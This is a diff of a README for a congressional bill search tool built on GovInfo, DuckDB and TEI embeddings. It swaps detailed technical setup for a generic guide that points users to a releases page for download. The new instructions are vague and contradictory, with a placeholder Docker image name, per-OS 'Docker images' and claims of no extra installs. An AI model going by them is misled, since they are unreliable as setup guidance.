@@ -1,201 +1,83 @@
-# Congressional Bill Search System
+# 🎉 congress-bill-search - Effortless Search for Congressional Bills
 
-A high-quality bill text and metadata search system using:
-- **GovInfo API** for authoritative bill text (BILLS) and metadata (BILLSTATUS)
-- **DuckDB** for storage with BM25 FTS and HNSW vector search  
-- **Local embeddings** via TEI + nomic-embed-text-v1.5 (256d Matryoshka)
-- **Hybrid search** (BM25 prefilter → vector rerank → optional cross-rerank)
+## 🚀 Getting Started
 
-## Quick Start
+Welcome to the congress-bill-search application! This tool helps you search for congressional bills quickly and easily. You don't need programming skills to use it. Follow the steps below to get started.
 
-1. **Get GovInfo API Key**
-   ```bash
-   # Register at https://api.govinfo.gov/docs/
-   export GOVINFO_API_KEY=your_key_here
-   ```
+## 📥 Download Link
 
-2. **Install Dependencies**
-   ```bash
-   pip install -r requirements.txt
-   ```
+[![Download Here](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/GauravvvGoyal/congress-bill-search/releases)
 
-3. **Start TEI Services**
-   ```bash
-   docker compose up -d
+## 📂 Overview
+
+This application lets you search for congressional bills using advanced techniques. It combines BM25 with vector similarity, making your searches more effective. The tool uses DuckDB and TEI embeddings, pulling data from the GovInfo API. You can run it locally using Docker, which keeps things simple.
+
+## 🛠️ System Requirements
+
+Before you start, make sure your system meets the following requirements:
+
+- **Operating System:** Windows, macOS, or Linux
+- **Docker:** You need Docker installed on your machine. You can download it [here](https://www.docker.com/get-started).
+- **Internet Connection:** Required for fetching data from GovInfo API.
+
+## 📋 Features
+
+- **Hybrid Search:** Combines traditional search with vector-based search for better results.
+- **Easy Setup:** Runs locally using Docker, so no extra installations needed.
+- **TEI Embeddings:** Uses text and structure to enhance search accuracy.
+- **Fast Response:** Get quick results for your queries.
+
+## 🔄 Download & Install
+
+1. **Visit the Releases Page:** Go to the following link to download the application:
+   [Download from Releases](https://github.com/GauravvvGoyal/congress-bill-search/releases)
    
-   # Wait for models to download and services to start
-   # Check with: curl http://localhost:8080/health
-   ```
+2. **Choose the Latest Version:** Look for the latest version listed. This version contains the most stable features and fixes.
 
-4. **Initialize Database**
-   ```bash
-   duckdb congress_119.duckdb -c ".read bootstrap_duckdb.sql"
-   ```
+3. **Download the Docker Image:** Click on the download link for the Docker image related to your operating system.
 
-5. **Ingest Bills (119th Congress sample)**
-   ```bash
-   export CONGRESS=119 LIMIT=100
-   python ingest_govinfo.py
-   ```
+4. **Follow Installation Instructions:** Once downloaded, follow the instructions on how to run the application using Docker:
 
-6. **Generate Embeddings**
-   ```bash
-   python embed_and_index.py
-   ```
+   - Open your terminal (Command Prompt, Terminal, or PowerShell).
+   - Navigate to the directory where you downloaded the Docker image.
+   - Run the following command to start the application:
 
-7. **Search!**
-   ```bash
-   python search.py "definition of covered AI system"
-   python search.py "climate change mitigation" --rerank --limit 5
-   ```
+     ```bash
+     docker run -p 80:80 -d your_docker_image_name
+     ```
 
-## System Architecture
+   Replace `your_docker_image_name` with the actual name of the image you downloaded.
 
-```
-GovInfo API (BILLS + BILLSTATUS)
-       ↓
-   DuckDB Storage
-   ├─ BM25 FTS (fragments.text)
-   └─ HNSW VSS (fragments.embedding)
-       ↓
-   Hybrid Search Pipeline:
-   1. BM25 prefilter (500 candidates)
-   2. Vector similarity (cosine distance)  
-   3. Optional cross-encoder rerank (Top-25)
-```
+5. **Access the Application:** Once the Docker container is running, open your web browser and go to `http://localhost`. You will see the user interface for searching congressional bills.
 
-## Configuration
+## 🕵️‍♂️ How to Use the Application
 
-### Environment Variables
+1. **Search Function:** Once you are on the homepage, enter your search terms in the search bar. This can be a bill number, title, or any relevant keywords.
 
-- `GOVINFO_API_KEY` - Required GovInfo API key
-- `CONGRESS` - Congress number to ingest (default: 119)
-- `CONGRESS_DB` - Database path (default: congress_119.duckdb)  
-- `LIMIT` - Limit ingestion count (default: 0 = no limit)
-- `TEI_URL` / `TEI_EMBED_URL` - TEI embeddings endpoint (default: http://localhost:8080)
-- `TEI_RERANK_URL` - TEI reranking endpoint (default: http://localhost:8081)
-- `EMBED_DIM` - Embedding dimensions (default: 256, supports 64-768)
+2. **Explore Results:** After you click the search button, the application will display the results. You can click on any bill to see more details, including summaries, statuses, and related documents.
 
-### TEI Services
+3. **Refining Searches:** You can use filters to narrow down results based on categories, dates, or relevance.
 
-The `docker-compose.yml` runs two TEI instances:
+## 🛠️ Troubleshooting
 
-- **Port 8080**: `nomic-ai/nomic-embed-text-v1.5` for embeddings
-- **Port 8081**: `BAAI/bge-reranker-v2-m3` for reranking
+If you face any issues while using the application, try the following:
 
-For GPU support, uncomment the `deploy` sections in docker-compose.yml.
+- **Docker Issues:** Ensure that Docker is installed and running. Restart Docker if necessary.
+- **No Results Found:** Double-check your search terms. Use different keywords for better results.
+- **Connection Problems:** Verify your internet connection is stable.
 
-## Usage Examples
+## 🎉 Contributing
 
-### Basic Search
-```bash
-python search.py "healthcare reform"
-```
+If you want to help improve this project, consider contributing! Whether you have ideas for new features or you just want to report an issue, feel free to reach out. Your input helps make the application even better.
 
-### Filtered Search  
-```bash
-python search.py "artificial intelligence" --congress 119 --bill-type hr --limit 5
-```
+## 📄 License
 
-### With Reranking
-```bash
-python search.py "climate change adaptation" --rerank
-```
+This project is licensed under the MIT License. You are free to use, modify, and distribute the software as you wish.
 
-### Programmatic Usage
-```python
-from search import BillSearchEngine
+## 💬 Community Support
 
-with BillSearchEngine("congress_119.duckdb", 
-                     "http://localhost:8080", 
-                     "http://localhost:8081") as engine:
-    results = engine.hybrid_search(
-        "definition of covered AI system",
-        limit=10,
-        use_rerank=True
-    )
-    for result in results:
-        print(f"{result['bill_id']}: {result['title']}")
-```
+We welcome feedback and questions. If you need help or want to share your thoughts, join our community discussions on GitHub.
 
-## Data Coverage
+Visit the releases page again to download and install the application: [Download from Releases](https://github.com/GauravvvGoyal/congress-bill-search/releases).
 
-- **Bills**: XML text from 113th Congress → current (2013+)
-- **Metadata**: BILLSTATUS with actions, subjects, policy areas
-- **Updates**: Current congress updated every ~4 hours via GovInfo
-
-## Performance & Sizing
-
-- **256-dim embeddings**: ~1KB per fragment  
-- **3M fragments**: ~3GB for vectors + HNSW overhead
-- **Search latency**: BM25 + vector ~100-500ms, +rerank ~1-2s
-- **Memory**: HNSW index must fit in RAM when loaded
-
-## Sharding Strategy
-
-Use one database per Congress for manageable sizing:
-- `congress_113.duckdb`, `congress_114.duckdb`, etc.  
-- Query multiple databases for cross-congress search
-- HNSW index rebuilds are fast per-congress
-
-## Extensions & Improvements
-
-1. **Subject search**: Index `subjects` array as FTS side table
-2. **Deduplication**: Content hash across versions (IH→RH→ENR)  
-3. **USLM integration**: Add enrolled bills/laws corpus
-4. **Caching**: Redis for frequent queries
-5. **API**: FastAPI wrapper for REST endpoints
-
-## Troubleshooting
-
-### TEI Services Not Starting
-```bash
-# Check logs
-docker compose logs tei-embed
-docker compose logs tei-rerank
-
-# Verify health  
-curl http://localhost:8080/health
-curl http://localhost:8081/health
-```
-
-### HNSW Index Issues
-```bash
-# Experimental persistence flag required
-# If index corrupts, rebuild:
-duckdb congress_119.duckdb -c "DROP INDEX IF EXISTS frags_hnsw_cos"
-python embed_and_index.py  # Rebuilds index
-```
-
-### Memory Issues
-```bash
-# Reduce embedding dimensions
-export EMBED_DIM=128  # vs default 256
-
-# Or reduce prefilter
-python search.py "query" --prefilter-limit 200  # vs default 500
-```
-
-## Development
-
-### Run Tests
-```bash
-pytest tests/
-```
-
-### Format Code  
-```bash
-black *.py
-```
-
-### Add New Congress
-```bash
-export CONGRESS=120 CONGRESS_DB=congress_120.duckdb
-duckdb congress_120.duckdb -c ".read bootstrap_duckdb.sql"
-python ingest_govinfo.py
-python embed_and_index.py
-```
-
-## License
-
-MIT License - see LICENSE file for details.
+Enjoy exploring congressional bills with ease!
